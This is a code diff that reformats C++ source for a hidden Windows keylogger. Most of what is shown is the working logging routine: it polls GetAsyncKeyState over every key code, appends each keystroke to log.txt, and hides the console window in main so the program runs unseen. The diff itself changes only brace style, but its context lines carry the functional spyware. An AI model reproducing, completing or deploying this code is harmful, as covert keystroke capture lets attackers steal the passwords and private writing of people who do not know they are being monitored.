@@ -5,16 +5,19 @@
 
 using namespace std;
 
-void startLogging(){
+void startLogging()
+{
     char c;
     while (true)
     {
         for (c = 0; c <= 254; c++)
         {
-            if(GetAsyncKeyState(c) & 0x1){
+            if (GetAsyncKeyState(c) & 0x1)
+            {
                 ofstream log;
                 log.open("log.txt", ios::app);
-                switch (c){
+                switch (c)
+                {
                 case VK_BACK:
                     log << "[BACKSPACE]";
                     break;
@@ -71,7 +74,8 @@ void startLogging(){
     }
 }
 
-int main(){
-   ShowWindow(GetConsoleWindow(), SW_HIDE);
+int main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     startLogging();
 }
